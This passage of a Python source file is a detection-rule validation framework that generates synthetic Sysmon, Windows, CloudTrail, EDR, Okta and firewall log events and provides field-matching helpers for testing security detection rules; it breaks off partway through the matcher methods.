#!/usr/bin/env python3
"""
Detection Rule Validation Framework v3
=======================================
A production-grade test harness for validating detection rules against synthetic
attack telemetry and real imported log data.

Usage (library):
    from detection_validator import (
        TelemetryGenerator, DetectionEngine, TestRunner,
        SyntheticEvent, EventCategory, GradingConfig, RuleComparator,
    )

Usage (CLI):
    python detection_validator.py                           # Run built-in Rundll32 demo
    python detection_validator.py --engine improved         # Improved rule demo
    python detection_validator.py --compare                 # Side-by-side A/B comparison
    python detection_validator.py --events data.json        # Load events from file
    python detection_validator.py --html report.html        # Export HTML report
    python detection_validator.py --json report.json        # Export JSON report
    python detection_validator.py --export-events out.json  # Save generated events
    python detection_validator.py --tp 20 --tn 30 --seed 7  # Custom counts / seed

Changelog v3.1 vs v3.0:
    BUG FIX  - export_html_report(): evasion_resistance=None caused TypeError crash
               when formatting as a percentage. Now uses a pre-computed safe string.
    BUG FIX  - get_metrics() composite score: substituting 1.0 for None evasion
               resistance silently inflated grades. Now excluded from computation
               (remaining weights normalised) when no evasion events are present.
    BUG FIX  - generate_all(): docstring claimed events were shuffled but they were
               not. self.rng.shuffle() now applied before return.
    BUG FIX  - _random_ip(): while-True retry loop replaced with a pre-computed
               valid-first-octet list; eliminates any theoretical infinite-loop risk.
    BUG FIX  - datetime.utcnow() (deprecated Python 3.12+) replaced with
               datetime.now(timezone.utc) throughout.
    BUG FIX  - field_regex(): invalid patterns now emit logger.warning() before
               returning False, so silent misses are diagnosable.
    SECURITY - export_html_report(): all user-controlled values (rule name,
               event descriptions, notes, rec body/fix, matched conditions,
               log data snippets) now passed through html.escape() before
               interpolation into the HTML report. Prevents XSS in shared reports.

Changelog v3 vs v2:
    BUG FIX  - GradingConfig.compute_grade(): dead first loop removed;
               UnboundLocalError when score < 0.6 is now impossible.
    BUG FIX  - field_regex(): re.error is now caught; invalid patterns return False.
    BUG FIX  - SyntheticEvent.from_dict(): unknown EventCategory values no longer
               raise bare ValueError; raises ValidationError with context.
    BUG FIX  - CLI --export-events: used to instantiate a fresh TelemetryGenerator
               base class; now reuses the existing generator instance.
    BUG FIX  - _random_guid(): returns proper {GUID} format via uuid.uuid4()
               instead of a raw 32-char MD5 hex string.
    BUG FIX  - RuleComparator: compare() result is now cached; calling
               print_comparison() no longer re-runs both engines a second time.
    NEW      - nested_get(): resolves both flat ('src.process.cmdline') and nested
               ({'src': {'process': {'cmdline': '...'}}}) field access — required
               for SentinelOne S1QL event schemas used by app.py.
    NEW      - field_gte(), field_lte(): numeric >= / <= comparators added to base
               class so app.py's DynamicEngine can call them via super().
    NEW      - field_wildcard(): glob-style (* / ?) matching, case-insensitive.
    NEW      - field_not_in(): complement to field_in().
    NEW      - field_between(): numeric range check (inclusive).
    NEW      - TestRunner.get_by_outcome(), get_failures(), get_true_positives(),
               get_false_positives(), get_false_negatives(), get_evasion_missed().
    NEW      - TestRunner.run() accepts an optional progress_callback(int, int)
               for Streamlit / UI progress bars.
    NEW      - GradingConfig.validate_weights(): raises ValidationError if weights
               do not sum to 1.0 (within floating-point tolerance).
    NEW      - ValidationError exception class.
    NEW      - __version__ = "3.0.0" and __all__ public API export list.
    IMPROVED - export_html_report() now includes evasion analysis and category
               breakdown sections, matching app.py's build_html_report() quality.
    IMPROVED - print_report() emits a RECOMMENDATIONS section when the runner
               detects FN / FP / evasion failures (standalone-CLI usable).
    IMPROVED - _random_ip(): external pool now excludes RFC-1918 and
               special-use reserved prefixes (127.x, 169.254.x, 224.x, etc.).
    IMPROVED - _random_timestamp() uses datetime.datetime.utcnow() (no tzinfo games).
    IMPROVED - All public methods annotated with full type hints.
"""

from __future__ import annotations

import csv
import datetime
import fnmatch
import hashlib
import html as _html
import io
import json
import logging
import re
import string
import sys
import time
import uuid
import random
import argparse
from collections import Counter
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import Any, Callable, Iterator, Optional

__version__ = "3.1.0"
__author__  = "Detection Validator"

logger = logging.getLogger(__name__)

__all__ = [
    # Exceptions
    "ValidationError",
    # Enums / data models
    "EventCategory",
    "SyntheticEvent",
    "DetectionResult",
    "TestResult",
    # Core classes
    "TelemetryGenerator",
    "DetectionEngine",
    "GradingConfig",
    "TestRunner",
    "RuleComparator",
    # Example implementations
    "ExampleRundll32Generator",
    "ExampleRundll32Engine",
    "ImprovedRundll32Engine",
]


# ═══════════════════════════════════════════════════════════════════════════════
# EXCEPTIONS
# ═══════════════════════════════════════════════════════════════════════════════

class ValidationError(Exception):
    """
    Raised when framework inputs fail validation.

    Examples:
        - Unknown EventCategory value in from_dict()
        - GradingConfig weights that don't sum to 1.0
        - Empty event list passed to TestRunner
    """


# ═══════════════════════════════════════════════════════════════════════════════
# DATA MODELS
# ═══════════════════════════════════════════════════════════════════════════════

class EventCategory(Enum):
    TRUE_POSITIVE           = "true_positive"   # Attack activity — rule SHOULD fire
    TRUE_NEGATIVE           = "true_negative"   # Benign activity — rule should NOT fire
    FALSE_POSITIVE_CANDIDATE = "fp_candidate"   # Tricky benign — stress test
    EVASION                 = "evasion"          # Attack variant — bypass attempt


@dataclass
class SyntheticEvent:
    """A single synthetic (or imported) log event for testing."""
    event_id:           str
    category:           EventCategory
    description:        str
    log_data:           dict
    attack_technique:   str  = ""                          # MITRE ATT&CK ID, e.g. T1218.011
    expected_detection: bool = True                        # Should the rule detect this?
    notes:              str  = ""
    tags:               list = field(default_factory=list) # Freeform labels
    severity:           str  = ""                          # Expected severity if detected

    def to_dict(self) -> dict:
        return {
            "event_id":           self.event_id,
            "category":           self.category.value,
            "description":        self.description,
            "log_data":           self.log_data,
            "attack_technique":   self.attack_technique,
            "expected_detection": self.expected_detection,
            "notes":              self.notes,
            "tags":               self.tags,
            "severity":           self.severity,
        }

    @classmethod
    def from_dict(cls, d: dict) -> "SyntheticEvent":
        """
        Deserialise a dict (e.g. from JSON export).

        Raises:
            ValidationError: if the 'category' value is not a valid EventCategory.
        """
        raw_cat = d.get("category", "")
        try:
            cat = EventCategory(raw_cat)
        except ValueError:
            valid = [e.value for e in EventCategory]
            raise ValidationError(
                f"Unknown EventCategory '{raw_cat}'. Valid values: {valid}"
            ) from None
        return cls(
            event_id           = d["event_id"],
            category           = cat,
            description        = d["description"],
            log_data           = d["log_data"],
            attack_technique   = d.get("attack_technique", ""),
            expected_detection = d.get("expected_detection", True),
            notes              = d.get("notes", ""),
            tags               = d.get("tags", []),
            severity           = d.get("severity", ""),
        )


@dataclass
class DetectionResult:
    """Result of running a single log event through the detection engine."""
    event_id:           str
    matched:            bool
    matched_conditions: list  = field(default_factory=list)
    confidence_score:   float = 0.0
    execution_time_ms:  float = 0.0   # Wall-clock time for the evaluation


@dataclass
class TestResult:
    """Combined outcome for one event — event + detection + pass/fail verdict."""
    event:     SyntheticEvent
    detection: DetectionResult
    outcome:   str  = ""    # TP / FP / TN / FN
    passed:    bool = False  # Did reality match expectation?

    def __post_init__(self):
        exp = self.event.expected_detection
        det = self.detection.matched
        if exp and det:
            self.outcome, self.passed = "TP", True
        elif exp and not det:
            self.outcome, self.passed = "FN", False
        elif not exp and det:
            self.outcome, self.passed = "FP", False
        else:
            self.outcome, self.passed = "TN", True


# ═══════════════════════════════════════════════════════════════════════════════
# TELEMETRY GENERATOR  (base class)
# ═══════════════════════════════════════════════════════════════════════════════

class TelemetryGenerator:
    """
    Base class for generating synthetic log events.

    Subclass this and implement the four generate_* methods for your
    specific log source and attack technique.

    Built-in helpers produce realistic events for:
      Sysmon EventIDs 1, 3, 11, 22 · Windows Security 4688/4624
      Network flow / firewall · DNS · Web proxy / HTTP · AWS CloudTrail
      SentinelOne EDR · ProofPoint TAP · Okta System Log · PAN-OS
    """

    def __init__(self, seed: int = 42):
        self.rng            = random.Random(seed)
        self._event_counter = 0

    # ── Counter ──────────────────────────────────────────────────────────────

    def _next_id(self, prefix: str = "EVT") -> str:
        self._event_counter += 1
        return f"{prefix}-{self._event_counter:04d}"

    # ── Randomisation primitives ─────────────────────────────────────────────

    def _random_hostname(self) -> str:
        prefixes = ["WS", "PC", "LT", "SRV", "DC", "APP", "DB", "WEB", "FS", "ADMIN"]
        return f"{self.rng.choice(prefixes)}-{self.rng.randint(1000, 9999)}"

    def _random_username(self) -> str:
        first = ["john", "jane", "admin", "svc", "mike", "sarah", "deploy",
                 "backup", "monitor", "build", "david", "emma", "robert", "lisa"]
        last  = ["smith", "doe", "ops", "account", "johnson", "williams", "brown",
                 "jones", "davis", "miller", "wilson", "moore", "taylor", "thomas"]
        return f"{self.rng.choice(first)}.{self.rng.choice(last)}"

    def _random_domain(self) -> str:
        return self.rng.choice(["CORP", "CONTOSO", "ACME", "INTERNAL", "PROD"])

    def _random_pid(self) -> int:
        return self.rng.randint(1000, 65535)

    def _random_guid(self) -> str:
        """
        Return a proper UUID4 string in Windows GUID format: {xxxxxxxx-xxxx-...}.

        FIX v3: Previously returned a 32-char lowercase MD5 hex string with no
        dashes. Sysmon events use the bracketed UUID format.
        """
        return "{" + str(uuid.UUID(int=self.rng.getrandbits(128), version=4)).upper() + "}"

    def _random_timestamp(self, days_back: int = 7) -> str:
        """
        Return an ISO-8601 UTC timestamp string.

        FIX v3: Previously used datetime.now(utc).replace(tzinfo=None) which
        is an anti-pattern. Now uses datetime.now(timezone.utc).
        FIX v3.1: Replaced deprecated datetime.utcnow() with timezone-aware equivalent.
        """
        base = datetime.datetime.now(datetime.timezone.utc) - datetime.timedelta(
            seconds=self.rng.randint(0, days_back * 86400)
        )
        return base.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"

    def _random_ip(self, internal: bool = True) -> str:
        """
        Return a random IP address.

        FIX v3: External IP pool now excludes RFC-1918, loopback (127.x),
        link-local (169.254.x), multicast (224-239.x), and reserved (240-255.x)
        ranges to produce realistic public IPs.
        FIX v3.1: Replaced while-True retry loop with a pre-computed valid-octet
        list, eliminating any theoretical infinite-loop risk.
        """
        if internal:
            return (f"10.{self.rng.randint(0, 255)}"
                    f".{self.rng.randint(1, 254)}"
                    f".{self.rng.randint(1, 254)}")
        # External: avoid all reserved/private first octets
        _BLOCKED = {10, 127, 169, 172, 192, 224, 225, 226, 227, 228, 229,
                    230, 231, 232, 233, 234, 235, 236, 237, 238, 239,
                    240, 241, 242, 243, 244, 245, 246, 247, 248, 249,
                    250, 251, 252, 253, 254, 255, 0}
        _VALID_FIRST = [i for i in range(1, 224) if i not in _BLOCKED]
        first = self.rng.choice(_VALID_FIRST)
        return (f"{first}.{self.rng.randint(0, 255)}"
                f".{self.rng.randint(0, 255)}"
                f".{self.rng.randint(1, 254)}")

    def _random_mac(self) -> str:
        return ":".join(f"{self.rng.randint(0, 255):02x}" for _ in range(6))

    def _random_fqdn(self, malicious: bool = False) -> str:
        if malicious:
            # Realistic attacker-registered TLDs (post-2023 attacker trends)
            tlds  = [".xyz", ".top", ".ru", ".cn", ".cc", ".pw", ".vip", ".shop"]
            words = ["update", "cdn", "sync", "api", "dl", "data", "info",
                     "svc", "auth", "login", "secure", "portal"]
            return f"{self.rng.choice(words)}{self.rng.randint(1, 999)}{self.rng.choice(tlds)}"
        tlds  = [".com", ".net", ".org", ".io"]
        words = ["google", "microsoft", "github", "amazon", "cloudflare",
                 "office365", "akamai", "fastly", "azureedge"]
        return f"{self.rng.choice(words)}{self.rng.choice(tlds)}"

    def _random_user_agent(self) -> str:
        return self.rng.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
            "Microsoft-CryptoAPI/10.0",
            "Windows-Update-Agent/10.0.10011.16384 Client-Protocol/2.33",
            "aws-cli/2.15.0 Python/3.11.6 Windows/10",
        ])

    def _random_hash(self, algo: str = "sha256") -> str:
        length = {"md5": 32, "sha1": 40, "sha256": 64}.get(algo, 64)
        return "".join(self.rng.choices("0123456789abcdef", k=length))

    def _random_aws_account(self) -> str:
        return "".join(self.rng.choices("0123456789", k=12))

    def _random_aws_region(self) -> str:
        return self.rng.choice(["us-east-1", "us-west-2", "eu-west-1",
                                 "eu-central-1", "ap-southeast-1", "ap-northeast-1"])

    # ── Base event templates ─────────────────────────────────────────────────

    def _base_sysmon_event(self, event_id: int = 1) -> dict:
        """Sysmon EventID 1 (Process Creation) base structure."""
        return {
            "EventID":           event_id,
            "UtcTime":           self._random_timestamp(),
            "ProcessGuid":       self._random_guid(),
            "ProcessId":         self._random_pid(),
            "Computer":          self._random_hostname(),
            "User":              f"{self._random_domain()}\\{self._random_username()}",
            "LogonGuid":         self._random_guid(),
            "LogonId":           hex(self.rng.randint(0x10000, 0xFFFFF)),
            "TerminalSessionId": self.rng.randint(0, 5),
            "IntegrityLevel":    self.rng.choice(["Low", "Medium", "High", "System"]),
            "Hashes":            f"SHA256={self._random_hash('sha256')}",
        }

    def _base_sysmon_network_event(self) -> dict:
        """Sysmon EventID 3 (Network Connection)."""
        base = self._base_sysmon_event(event_id=3)
        base.update({
            "Protocol":           self.rng.choice(["tcp", "udp"]),
            "Initiated":          str(self.rng.choice([True, False])).lower(),
            "SourceIp":           self._random_ip(internal=True),
            "SourcePort":         self.rng.randint(49152, 65535),
            "SourceHostname":     self._random_hostname(),
            "DestinationIp":      self._random_ip(internal=self.rng.choice([True, False])),
            "DestinationPort":    self.rng.choice([80, 443, 445, 3389, 8080, 8443, 22, 53]),
            "DestinationHostname": self._random_fqdn(),
        })
        return base

    def _base_sysmon_file_event(self) -> dict:
        """Sysmon EventID 11 (FileCreate)."""
        base = self._base_sysmon_event(event_id=11)
        base.update({
            "TargetFilename":  rf"C:\Users\{self._random_username()}\AppData\Local\Temp\file_{self.rng.randint(1000,9999)}.tmp",
            "CreationUtcTime": self._random_timestamp(),
        })
        return base

    def _base_sysmon_dns_event(self) -> dict:
        """Sysmon EventID 22 (DNS Query)."""
        base = self._base_sysmon_event(event_id=22)
        base.update({
            "QueryName":    self._random_fqdn(),
            "QueryStatus":  "0",
            "QueryResults": self._random_ip(internal=False),
        })
        return base

    def _base_windows_security_event(self, event_id: int = 4688) -> dict:
        """Windows Security log base (EventID 4688 process creation)."""
        return {
            "EventID":            event_id,
            "TimeCreated":        self._random_timestamp(),
            "Computer":           self._random_hostname(),
            "SubjectUserName":    self._random_username(),
            "SubjectDomainName":  self._random_domain(),
            "SubjectLogonId":     hex(self.rng.randint(0x10000, 0xFFFFF)),
            "NewProcessName":     r"C:\Windows\System32\cmd.exe",
            "CommandLine":        "cmd.exe",
            "ParentProcessName":  r"C:\Windows\explorer.exe",
            "TokenElevationType": self.rng.choice(["%%1936", "%%1937", "%%1938"]),
        }

    def _base_windows_logon_event(self, logon_type: int = 3) -> dict:
        """Windows Security EventID 4624 (Logon)."""
        base = self._base_windows_security_event(event_id=4624)
        base.update({
            "LogonType":                 logon_type,
            "TargetUserName":            self._random_username(),
            "TargetDomainName":          self._random_domain(),
            "IpAddress":                 self._random_ip(internal=True),
            "IpPort":                    self.rng.randint(49152, 65535),
            "WorkstationName":           self._random_hostname(),
            "LogonProcessName":          self.rng.choice(["NtLmSsp", "Kerberos", "Negotiate"]),
            "AuthenticationPackageName": self.rng.choice(["NTLM", "Kerberos"]),
        })
        return base

    def _base_network_event(self) -> dict:
        """Generic network flow / firewall event."""
        return {
            "timestamp":      self._random_timestamp(),
            "src_ip":         self._random_ip(internal=True),
            "src_port":       self.rng.randint(49152, 65535),
            "dst_ip":         self._random_ip(internal=self.rng.choice([True, False])),
            "dst_port":       self.rng.choice([80, 443, 445, 3389, 8080, 8443, 22, 53]),
            "protocol":       self.rng.choice(["TCP", "UDP"]),
            "bytes_sent":     self.rng.randint(64, 1048576),
            "bytes_received": self.rng.randint(64, 1048576),
            "action":         self.rng.choice(["allow", "deny"]),
            "sensor":         self._random_hostname(),
        }

    def _base_dns_query_event(self) -> dict:
        """DNS query log (e.g. from DNS server or Zeek)."""
        return {
            "timestamp":     self._random_timestamp(),
            "src_ip":        self._random_ip(internal=True),
            "query":         self._random_fqdn(),
            "query_type":    self.rng.choice(["A", "AAAA", "CNAME", "TXT", "MX"]),
            "response_code": self.rng.choice(["NOERROR", "NXDOMAIN", "SERVFAIL"]),
            "answers":       [self._random_ip(internal=False)],
            "ttl":           self.rng.randint(30, 86400),
            "sensor":        self._random_hostname(),
        }

    def _base_proxy_event(self) -> dict:
        """Web proxy / HTTP access log."""
        return {
            "timestamp":    self._random_timestamp(),
            "src_ip":       self._random_ip(internal=True),
            "user":         self._random_username(),
            "method":       self.rng.choice(["GET", "POST", "PUT", "CONNECT"]),
            "url":          f"https://{self._random_fqdn()}/path/{self.rng.randint(1, 999)}",
            "status_code":  self.rng.choice([200, 301, 302, 403, 404, 500]),
            "user_agent":   self._random_user_agent(),
            "bytes_out":    self.rng.randint(100, 50000),
            "bytes_in":     self.rng.randint(100, 500000),
            "content_type": self.rng.choice(["text/html", "application/json",
                                              "application/octet-stream"]),
            "category":     self.rng.choice(["Business", "Technology", "Uncategorized"]),
        }

    def _base_cloudtrail_event(self, event_name: str = "DescribeInstances") -> dict:
        """AWS CloudTrail event structure."""
        return {
            "eventVersion":   "1.08",
            "eventTime":      self._random_timestamp(),
            "eventSource":    "ec2.amazonaws.com",
            "eventName":      event_name,
            "awsRegion":      self._random_aws_region(),
            "sourceIPAddress": self._random_ip(internal=False),
            "userAgent":      self._random_user_agent(),
            "userIdentity": {
                "type":        self.rng.choice(["IAMUser", "AssumedRole", "Root"]),
                "arn":         f"arn:aws:iam::{self._random_aws_account()}:user/{self._random_username()}",
                "accountId":   self._random_aws_account(),
                "principalId": self._random_hash("md5")[:20].upper(),
            },
            "requestParameters":  {},
            "responseElements":   None,
            "errorCode":          None,
            "errorMessage":       None,
        }

    def _base_sentinelone_event(self, event_type: str = "Process Creation") -> dict:
        """SentinelOne EDR event structure (S1QL v2 dot-notation schema)."""
        return {
            "event.type":                    event_type,
            "event.time":                    self._random_timestamp(),
            "site.name":                     "Default",
            "endpoint.name":                 self._random_hostname(),
            "endpoint.os":                   "windows",
            "endpoint.os.version":           "10.0.19045",
            "agent.version":                 "23.4.1.1",
            "src.process.name":              "cmd.exe",
            "src.process.image.path":        r"C:\Windows\System32\cmd.exe",
            "src.process.cmdline":           "cmd.exe /c normal_operation",
            "src.process.pid":               self._random_pid(),
            "src.process.user":              f"CORP\\{self._random_username()}",
            "src.process.displayName":       "Windows Command Processor",
            "src.process.parent.name":       "explorer.exe",
            "src.process.parent.image.path": r"C:\Windows\explorer.exe",
            "tgt.process.name":              "notepad.exe",
            "tgt.process.image.path":        r"C:\Windows\System32\notepad.exe",
            "tgt.process.cmdline":           "notepad.exe",
            "tgt.process.pid":               self._random_pid(),
            "tgt.process.displayName":       "Notepad",
            "network.direction":             "OUTGOING",
            "network.dst.ip":                self._random_ip(internal=False),
            "network.dst.port":              443,
        }

    def _base_okta_event(self, event_type: str = "user.authentication.sso") -> dict:
        """Okta System Log event structure."""
        return {
            "eventType":                              event_type,
            "published":                              self._random_timestamp(),
            "severity":                               "INFO",
            "displayMessage":                         "User single sign on to app",
            "actor.alternateId":                      f"{self._random_username()}@company.com",
            "actor.type":                             "User",
            "actor.displayName":                      self._random_username().replace(".", " ").title(),
            "client.ipAddress":                       self._random_ip(internal=True),
            "client.geographicalContext.country":     "US",
            "client.geographicalContext.city":        "New York",
            "client.geographicalContext.state":       "New York",
            "client.device":                          "Computer",
            "client.userAgent.rawUserAgent":          self._random_user_agent(),
            "securityContext.isProxy":                False,
            "securityContext.isTor":                  False,
            "securityContext.asOrg":                  "Comcast Cable",
            "outcome.result":                         "SUCCESS",
            "authenticationContext.credentialType":   "PASSWORD",
            "authenticationContext.authenticationProvider": "OKTA_AUTHENTICATION_PROVIDER",
            "debugContext.debugData.threatSuspected": "false",
            "target[0].alternateId":                  f"{self._random_username()}@company.com",
            "target[0].type":                         "AppUser",
        }

    def _base_proofpoint_event(self) -> dict:
        """ProofPoint TAP message event structure."""
        return {
            "msg.sender":           f"user@{self._random_fqdn()}",
            "msg.sender.domain":    self._random_fqdn(),
            "msg.sender.ip":        self._random_ip(internal=False),
            "msg.rcpt":             f"{self._random_username()}@company.com",
            "msg.subject":          "Quarterly Update",
            "msg.parts.filename":   "document.pdf",
            "msg.parts.content_type": "application/pdf",
            "msg.urls.domain":      "office.com",
            "msg.threat.score":     8,
            "msg.threat.verdict":   "CLEAN",
            "msg.dkim":             "pass",
            "msg.spf":              "pass",
            "msg.dmarc":            "pass",
            "msg.senderReputation": "known",
            "msg.completelyRewritten": True,
            "msg.quarantined":      False,
        }

    def _base_panfw_event(self) -> dict:
        """Palo Alto Networks firewall traffic/threat log structure."""
        return {
            "type":      "TRAFFIC",
            "subtype":   "end",
            "receive_time": self._random_timestamp(),
            "src":       self._random_ip(internal=True),
            "dst":       self._random_ip(internal=False),
            "sport":     self.rng.randint(49152, 65535),
            "dport":     443,
            "proto":     "tcp",
            "application": "ssl",
            "from":      "trust",
            "to":        "untrust",
            "action":    "allow",
            "bytes":     self.rng.randint(1000, 100000),
            "bytes_sent": self.rng.randint(200, 10000),
            "bytes_received": self.rng.randint(200, 90000),
            "packets":   self.rng.randint(10, 1000),
            "rule":      "Default-Allow-Web",
            "srcloc":    "US",
            "dstloc":    "US",
            "srcuser":   self._random_username(),
            "severity":  "low",
            "threatid":  0,
            "category":  "any",
        }

    # ── Override in subclass ─────────────────────────────────────────────────

    def generate_true_positives(self, count: int = 10) -> list[SyntheticEvent]:
        raise NotImplementedError("Implement in subclass for your specific rule")

    def generate_true_negatives(self, count: int = 15) -> list[SyntheticEvent]:
        raise NotImplementedError("Implement in subclass for your specific rule")

    def generate_fp_candidates(self, count: int = 5) -> list[SyntheticEvent]:
        raise NotImplementedError("Implement in subclass for your specific rule")

    def generate_evasion_samples(self, count: int = 5) -> list[SyntheticEvent]:
        raise NotImplementedError("Implement in subclass for your specific rule")

    def generate_all(
        self,
        tp: int = 10,
        tn: int = 15,
        fp: int = 5,
        evasion: int = 5,
    ) -> list[SyntheticEvent]:
        """
        Generate a full shuffled test dataset.

        FIX v3.1: Events are now actually shuffled using the seeded RNG so the
        ordering is reproducible but not trivially stratified (all TPs first,
        then TNs, etc.). The previous version claimed to shuffle but did not.
        """
        events: list[SyntheticEvent] = []
        events.extend(self.generate_true_positives(tp))
        events.extend(self.generate_true_negatives(tn))
        events.extend(self.generate_fp_candidates(fp))
        events.extend(self.generate_evasion_samples(evasion))
        self.rng.shuffle(events)
        return events

    def export_events(self, events: list[SyntheticEvent], path: str) -> None:
        """Serialise events to a JSON file for reuse across runs."""
        with open(path, "w", encoding="utf-8") as fh:
            json.dump([e.to_dict() for e in events], fh, indent=2)

    @staticmethod
    def import_events(path: str) -> list[SyntheticEvent]:
        """
        Load previously exported events from a JSON file.

        Raises:
            FileNotFoundError: if the path does not exist.
            ValidationError: if any row has an unknown EventCategory.
        """
        p = Path(path)
        if not p.exists():
            raise FileNotFoundError(f"Events file not found: {path}")
        with open(p, encoding="utf-8") as fh:
            data = json.load(fh)
        events = []
        for i, row in enumerate(data):
            try:
                events.append(SyntheticEvent.from_dict(row))
            except (KeyError, ValidationError) as exc:
                raise ValidationError(
                    f"Row {i} in '{path}' is malformed: {exc}"
                ) from exc
        return events


# ═══════════════════════════════════════════════════════════════════════════════
# DETECTION ENGINE  (base class)
# ═══════════════════════════════════════════════════════════════════════════════

class DetectionEngine:
    """
    Base class for detection rule logic.

    Subclass this and implement the `evaluate()` method with your rule's
    specific matching logic.  All utility methods below are available as
    both static helpers and as instance methods via self.

    Matching utilities
    ------------------
    Core:
        field_equals, field_contains, field_endswith, field_startswith
        field_regex, field_in, field_not_in, field_exists
    Numeric:
        field_gt, field_gte, field_lt, field_lte, field_between
    Multi-value:
        field_any_of, field_all_of
    String analysis:
        field_count, field_length_gt, field_length_lt
    Glob:
        field_wildcard
    Negation shorthand:
        field_not_contains
    Process-tree helpers:
        check_process_lineage, check_original_filename
    Nested field access:
        nested_get  (resolves both flat-key and dot-path nested dicts)
    """

    def __init__(
        self,
        rule_name: str = "Unnamed Rule",
        rule_metadata: Optional[dict] = None,
    ):
        self.rule_name     = rule_name
        self.rule_metadata = rule_metadata or {}

    def evaluate(self, event: dict) -> DetectionResult:
        """
        Evaluate a single log event against the rule.

        Must be overridden in every subclass.
        """
        raise NotImplementedError("Implement detection logic in subclass")

    # ── Nested field accessor ────────────────────────────────────────────────

    @staticmethod
    def nested_get(event: dict, field: str, default: str = "") -> str:
        """
        Resolve a field from an event that may be stored as either:
          • A flat key:  event['src.process.cmdline']   (S1QL flat export)
          • A nested key: event['src']['process']['cmdline']  (raw JSON)

        Tries flat key first (fastest), then walks the dot-separated path.

        NEW in v3 — required for SentinelOne S1QL dot-notation fields.

        Examples:
            nested_get({'src.process.cmdline': 'cmd'}, 'src.process.cmdline')
            → 'cmd'
            nested_get({'src': {'process': {'cmdline': 'cmd'}}}, 'src.process.cmdline')
            → 'cmd'
        """
        # Fast path: flat key exists
        if field in event:
            v = event[field]
            return str(v) if v is not None else default
        # Slow path: walk dot-separated path
        parts = field.split(".")
        node: Any = event
        for part in parts:
            if not isinstance(node, dict):
                return default
            node = node.get(part)
            if node is None:
                return default
        return str(node) if node is not None else default

    # ── Core field matchers ──────────────────────────────────────────────────

    @staticmethod
    def field_equals(
        event: dict, field: str, value: str, case_insensitive: bool = True
    ) -> bool:
        val = DetectionEngine.nested_get(event, field)
        return val.lower() == str(value).lower() if case_insensitive else val == str(value)

    @staticmethod
    def field_contains(
        event: dict, field: str, value: str, case_insensitive: bool = True
    ) -> bool:
        val = DetectionEngine.nested_get(event, field)
        return (str(value).lower() in val.lower()) if case_insensitive else (str(value) in val)

    @staticmethod
    def field_not_contains(
        event: dict, field: str, value: str, case_insensitive: bool = True
    ) -> bool:
        """Negated field_contains shorthand."""
        return not DetectionEngine.field_contains(event, field, value, case_insensitive)

    @staticmethod
    def field_startswith(
        event: dict, field: str, value: str, case_insensitive: bool = True
    ) -> bool:
        val = DetectionEngine.nested_get(event, field)
        return val.lower().startswith(str(value).lower()) if case_insensitive else val.startswith(str(value))

    @staticmethod
    def field_endswith(
        event: dict, field: str, value: str, case_insensitive: bool = True
    ) -> bool:
        val = DetectionEngine.nested_get(event, field)
        return val.lower().endswith(str(value).lower()) if case_insensitive else val.endswith(str(value))

    @staticmethod
    def field_regex(
        event: dict, field: str, pattern: str, flags: int = re.IGNORECASE
    ) -> bool:
        """
        Match a field value against a regex pattern.

        FIX v3: Previously crashed on invalid regex patterns (re.error propagated
        up to the caller). Now catches re.error and returns False, so a bad
        pattern in a parsed rule never kills the evaluation loop.
        FIX v3.1: Invalid patterns are now logged at WARNING level so they can
        be diagnosed without crashing the caller.
        """
        val = DetectionEngine.nested_get(event, field)
        try:
            return bool(re.search(pattern, val, flags))
        except re.error as exc:
            logger.warning("field_regex: invalid pattern %r on field %r — %s", pattern, field, exc)
            return False

    @staticmethod
    def field_wildcard(
        event: dict, field: str, pattern: str, case_insensitive: bool = True
    ) -> bool:
        """
        Glob-style wildcard match (* and ? supported).

        NEW in v3.  Uses fnmatch under the hood.

        Example: field_wildcard(evt, 'Image', '*\\\\rundll32.*')
        """
        val = DetectionEngine.nested_get(event, field)
        if case_insensitive:
            return fnmatch.fnmatchcase(val.lower(), pattern.lower())
        return fnmatch.fnmatchcase(val, pattern)

    @staticmethod
    def field_in(
        event: dict, field: str, values: list, case_insensitive: bool = True
    ) -> bool:
        """True if the field value exactly matches any item in *values*."""
        val = DetectionEngine.nested_get(event, field)
        return (val.lower() in [str(v).lower() for v in values]
                if case_insensitive else val in [str(v) for v in values])

    @staticmethod
    def field_not_in(
        event: dict, field: str, values: list, case_insensitive: bool = True
    ) -> bool:
        """Negated field_in — True if the field value is NOT in *values*.

        NEW in v3.
        """
        return not DetectionEngine.field_in(event, field, values, case_insensitive)

    @staticmethod
    def field_exists(event: dict, field: str) -> bool:
        """True if the field is present, non-null, and non-empty."""
        val = DetectionEngine.nested_get(event, field)
        return val != ""

    # ── Numeric matchers ─────────────────────────────────────────────────────

    @staticmethod
    def _num(event: dict, field: str) -> Optional[float]:
        try:
            return float(DetectionEngine.nested_get(event, field, ""))
        except (ValueError, TypeError):
            return None

    @staticmethod
    def field_gt(event: dict, field: str, threshold: float) -> bool:
        n = DetectionEngine._num(event, field)
        return n is not None and n > threshold

    @staticmethod
    def field_gte(event: dict, field: str, threshold: float) -> bool:
        """Greater-than-or-equal. NEW in v3 — required by app.py DynamicEngine."""
        n = DetectionEngine._num(event, field)
        return n is not None and n >= threshold

    @staticmethod
    def field_lt(event: dict, field: str, threshold: float) -> bool:
        n = DetectionEngine._num(event, field)
        return n is not None and n < threshold

    @staticmethod
    def field_lte(event: dict, field: str, threshold: float) -> bool:
        """Less-than-or-equal. NEW in v3 — required by app.py DynamicEngine."""
        n = DetectionEngine._num(event, field)
        return n is not None and n <= threshold

    @staticmethod
    def field_between(
        event: dict, field: str, low: float, high: float, inclusive: bool = True
    ) -> bool:
        """
        True if the field's numeric value falls within [low, high].

        NEW in v3.

        Args:
            inclusive: if True (default) uses >=/<= bounds; otherwise >/<.
        """
        n = DetectionEngine._num(event, field)
        if n is None:
            return False
        return (low <= n <= high) if inclusive else (low < n < high)

    # ── Multi-value matchers ─────────────────────────────────────────────────

    @staticmethod
    def field_any_of(
        event: dict, field: str, values: list, case_insensitive: bool = True
    ) -> bool:
        """True if the field value *contains* ANY of the given substrings."""
        val = DetectionEngine.nested_get(event, field)
        if case_insensitive:
            val_l = val.lower()
            return any(str(v).lower() in val_l for v in values)
        return any(str(v) in val for v in values)

    @staticmethod
    def field_all_of(
        event: dict, field: str, values: list, case_insensitive: bool = True
    ) -> bool:
